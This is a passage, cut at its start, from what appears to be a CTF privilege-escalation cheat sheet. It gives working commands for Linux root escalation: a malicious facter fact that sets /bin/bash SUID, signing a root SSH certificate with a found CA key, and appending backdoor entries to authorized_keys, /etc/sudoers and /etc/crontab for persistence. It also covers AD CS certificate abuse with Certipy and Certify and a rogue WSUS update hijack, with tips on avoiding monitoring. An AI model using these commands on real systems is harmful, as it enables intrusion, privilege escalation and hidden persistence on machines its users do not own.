│   pre-built SetUID-root binary, escalating straight to root on mount
└─ Check `udisksctl --version` and PAM config for these classes of bug on any
    modern desktop-flavored Linux distro (openSUSE, Fedora, Ubuntu Desktop)
    — this is a current, actively-exploited privesc chain, not a legacy one

sudo-allowed installer/backup tool path traversal (write outside intended directory)

├─ Any sudo-allowed tool that downloads/installs packages, plugins, or
│   dependencies (language package managers, plugin installers) is worth
│   checking for a path-traversal bug in its own dependency-resolution code
│   — several package-index implementations across languages have shipped
│   traversal bugs letting a malicious package name/version write files
│   (e.g. an SSH authorized_keys entry) outside the intended install directory
└─ Similarly, sudo-allowed backup/restore tools built on tar/zip extraction
    are worth checking for path-traversal in the archive-extraction step —
    a single malicious filename in the archive can write anywhere the
    running (root) process has permission to write

Custom system-inventory/fact-gathering tool abuse (Puppet facter and similar)

# if sudo allows running a system-inventory tool with a custom facts/plugins
# directory option, and that tool loads arbitrary code from files it finds
# there (Puppet's facter is the classic example), drop a malicious fact file
# and let sudo execute it as root
echo 'system("chmod +s /bin/bash")' > /tmp/evil_facts.rb
sudo facter --custom-dir=/tmp

Race conditions on privileged temp-directory cleanup

├─ Some privileged setup helpers (package manager confinement wrappers being
│   a recent, real-world example) create and then tear down a private temp
│   directory during their startup sequence. If another system component
│   (a periodic tmpfiles cleanup job) deletes that directory at just the
│   wrong moment, you can win the race and substitute your own file — e.g.
│   a malicious dynamic linker — in the path the privileged process expects,
│   getting it to load and execute your code as root on its next run
└─ This class of bug rewards scripted repetition over manual timing — loop
    the race attempt in a tight shell/Python script rather than trying to
    hit the window by hand

SSH Certificate Authority key exposure

# if you find an SSH CA private key anywhere on the filesystem, you can sign
# a certificate for ANY principal — including root — without needing that
# account's own key or password at all
ssh-keygen -s ca_key -I "pwned-cert" -n root -V +52w root_key.pub
ssh -i root_key root@target

Symlink TOCTOU checks in root-run scripts

├─ Any root-run script that checks a file/path attribute (ownership, type,
│   permissions) and then acts on that same path in a later, separate step
│   has a time-of-check-to-time-of-use race window — if you can control the
│   path between the check and the use, swap in a symlink pointing somewhere
│   else and the script's later write/read follows your symlink instead of
│   the originally-checked file
└─ Look specifically for scripts that resolve a path, validate it, and only
    THEN open/write it in a separate statement — that gap is the bug

Container runtime escape (runc)

# a runc container-breakout vulnerability (CVE-2024-21626) allowed a
# maliciously crafted container image/working-directory file descriptor to
# leak into the host process, letting code inside the container escape to
# the underlying host — check your container runtime version whenever you
# land inside a container and privesc paths inside it look exhausted
runc --version

Obscured/obfuscated credentials in tool-specific config files

# some sync/backup tools (rclone is a common CTF example) store passwords in
# their config using simple reversible obfuscation rather than real
# encryption — if you find such a config, use the tool's own "reveal" mode
# rather than trying to brute-force or manually decode it
rclone obscure --reveal <obscured_password_string>

Recent sudo CVEs worth checking version for

├─ CVE-2025-32463 — a chroot-related flaw letting a user with any sudo
│   access at all escalate to full root via crafted nsswitch/plugin loading
│   inside a fake chroot environment
└─ CVE-2025-32462 — a flaw in host-restricted sudoers entries (rules meant
    to only apply on specific hosts) that could be abused to run commands as
    root regardless of the host restriction

1.6 Cashing Out Arbitrary Root-Level Write

Several vectors above (cron hijack, writable /etc/passwd, an arbitrary-write CVE, a misconfigured root-run script, etc.) all converge on the same end state: you can write a file as root, but the vector itself doesn't hand you a shell directly. Once you have that primitive, don't overthink the payload — any of these three standard moves turns "root can write a file" into "I have root":

├─ SSH key persistence — drop your own public key into root's authorized_keys
│   file, then SSH in directly with the matching private key. Quiet, doesn't
│   touch sudoers/passwd, and survives a reboot
├─ Sudoers NOPASSWD entry — grant your current low-priv user full passwordless
│   sudo rights, then just `sudo su` or `sudo bash -p` from your existing shell
└─ Cron persistence — schedule a cronjob that executes a script you control,
    for cases where you have write access but the write only gets read/executed
    later (e.g. you can't write directly to authorized_keys/sudoers due to
    permissions, but CAN write into a location a root cronjob already sources)

# SSH key — generate a keypair locally if you don't already have one
ssh-keygen -t ed25519 -f pwn_key -N ""
# then, using your root-level write primitive, append the PUBLIC key
echo "<contents of pwn_key.pub>" >> /root/.ssh/authorized_keys
# from your attacking machine
ssh -i pwn_key root@target

# Sudoers NOPASSWD — append via your write primitive (don't overwrite the
# whole file, just append a line — safer and less likely to break existing
# sudo config in a way that draws attention or breaks other functionality)
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
sudo bash -p

# Cron persistence — write a script and schedule it, useful when you can only
# write to specific paths rather than directly to authorized_keys/sudoers
echo '#!/bin/bash
chmod +s /bin/bash' > /tmp/pwn.sh
chmod +x /tmp/pwn.sh
echo "* * * * * root /tmp/pwn.sh" >> /etc/crontab
# wait up to 60s for the next minute tick, then:
/bin/bash -p

A couple of practical notes: appending to /etc/sudoers is generally safe via echo ... >> since a trailing malformed line is usually tolerated, but if you have the option, writing through visudo -c logic (or just double-checking syntax) avoids the small risk of corrupting the file and locking out sudo entirely, including for legitimate services during a live CTF. The SSH-key route is usually the cleanest of the three since it doesn't modify any existing system file at all, purely additive to a file most monitoring won't flag on a CTF box.

2.1 Decision Tree

Low-priv Windows shell

├─ Token impersonation opportunity via a running SYSTEM process? → Potato/RoguePotato
├─ DLL hijacking opportunity (writable dir in PATH before Windows dirs, or missing DLL)?

Active Directory Certificate Services (AD CS) abuse — ESC1–ESC16

If the box is domain-joined, AD CS misconfigurations are now one of the highest-yield privesc paths in AD-flavored CTFs (HTB, PG Practice, TryHackMe AD rooms) — often faster than any local vector once you have any domain user context, because a single misconfigured certificate template can jump straight to Domain Admin.

AD CS workflow
├─ Enumerate certificate templates and CA configuration with Certipy
├─ ESC1 — template lets a low-priv user specify an arbitrary Subject Alternative
│   Name (SAN) AND allows client authentication → request a cert impersonating
│   Domain Admin, then authenticate as them
├─ ESC2/ESC3 — template allows the "Any Purpose" or "Certificate Request Agent"
│   EKU → request an enrollment-agent cert, then enroll on behalf of any user
├─ ESC4 — you (or a group you're in) have write access to a template's
│   configuration itself → reconfigure it to be ESC1-vulnerable, then exploit
├─ ESC6/ESC8 — CA has EDITF_ATTRIBUTESUBJECTALTNAME2 set, or the CA web
│   enrollment endpoint (HTTP) is exposed → NTLM relay a machine account
│   authentication into a certificate request (ESC8), then use that cert
├─ ESC9/ESC10 — weak certificate mapping still enabled (legacy environments,
│   pre-Feb 2025 default) → certificate-based authentication doesn't strictly
│   bind to the intended account, enabling impersonation via UPN mismatch
├─ ESC17 — a newer template misconfiguration where the DNS/server-name field
│   on an issued certificate can be set to an arbitrary value the requester
│   chooses, rather than being tied to their own machine identity → issue a
│   certificate for a server name you don't own (e.g. a decommissioned host
│   that's no longer online to contest the name), then combine with a DNS
│   record write to point that hostname at infrastructure you control
└─ Once ANY valid high-priv certificate is obtained → use it to request a TGT
    (Kerberos ticket) via PKINIT, or pass-the-certificate for Schannel auth

# Certipy — enumerate and exploit in one tool (most common in current writeups)
certipy find -u user@domain -p 'password' -dc-ip 10.10.10.10 -vulnerable
certipy req -u user@domain -p 'password' -ca CA-NAME -template VulnTemplate \
  -upn administrator@domain
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10   # get TGT/NTLM hash

# Certify (C#/on-host alternative)
Certify.exe find /vulnerable
Certify.exe request /ca:CA-SERVER\CA-NAME /template:VulnTemplate /altname:Administrator

Note: since February 2025 Microsoft enforces Strong Certificate Mapping by default, closing ESC9/ESC10-style weak-mapping attacks unless a CTF box has explicitly downgraded the setting — check StrongCertificateBindingEnforcement before assuming those vectors are viable.

WSUS hijack for domain-wide code execution

├─ If you can obtain a certificate/identity for a server name matching (or
│   redirected to look like) the environment's WSUS server — e.g. via ESC17
│   plus a DNS record you control — stand up a rogue WSUS server at that
│   identity
├─ Clients configured to trust that WSUS server will pull and install
│   "updates" from it automatically
├─ Package a malicious update (e.g. one that adds your controlled account to
│   the local administrators group) and let normal WSUS update-check
│   behavior deliver and execute it domain-wide, without needing to touch
│   each host individually
└─ This is a powerful "quiet" persistence/escalation path precisely because
    it rides on infrastructure that's already trusted and automated

Monitoring/management agent abuse (CheckMk, and similar agent-based tools)

├─ Monitoring agents that run as SYSTEM and periodically execute
│   files placed in an agent-writable directory are a reliable lateral/
│   privesc vector once you land on a host running one
├─ CVE-2024-0670 (CheckMk agent) is a concrete example: it allows dropping
│   write-protected files into a temp directory that the agent
│   subsequently executes as SYSTEM, effectively bypassing intended write
│   protections on that directory
└─ General pattern to look for: any agent/daemon that runs with elevated
    privileges and periodically executes content from a directory with
    looser permissions than the agent's own privilege level

Enterprise backup software CVEs (Veeam and similar)

├─ Enterprise backup platforms (Veeam Backup & Replication is a common CTF
│   example, CVE-2023-27532) have repeatedly shipped deserialization or
│   credential-disclosure bugs in their service-to-service communication
│   protocols, letting an attacker with network access to the backup service
│   port retrieve stored credentials or achieve code execution as SYSTEM
└─ Always check installed backup/enterprise-management software versions
    against known CVEs — these products run with broad privileges by design
    and are a favorite target precisely because of that

15. Cross-Cutting Privesc Principles

General rule of thumb when stuck
├─ "What can I run/write that something with higher privilege will touch?"
│   (cron, scheduled task, service restart, log rotation, file watcher)
├─ "What privilege/capability do I already have that's misconfigured?"
│   (sudo rights, SUID bit, Windows privilege token, capability)
├─ "What credentials are lying around from misconfigured storage?"
│   (config files, history files, memory dumps, registry, backups)
└─ "Is there a version-specific known exploit?" (kernel, service, installed software)
    — check CVE databases, but treat kernel exploits as last resort in CTFs
    (can crash the box and lock out other players/graders)

Priority order to try (fastest/safest → slowest/riskiest): 1. sudo -l / whoami priv → GTFOBins / Potato exploits (near-zero risk, instant) 2. SUID/SGID/capabilities lookup 3. Cron/scheduled task hijack 4. Credential file hunting 5. Service/DLL misconfig exploitation 6. Kernel/CVE exploitation (last resort)
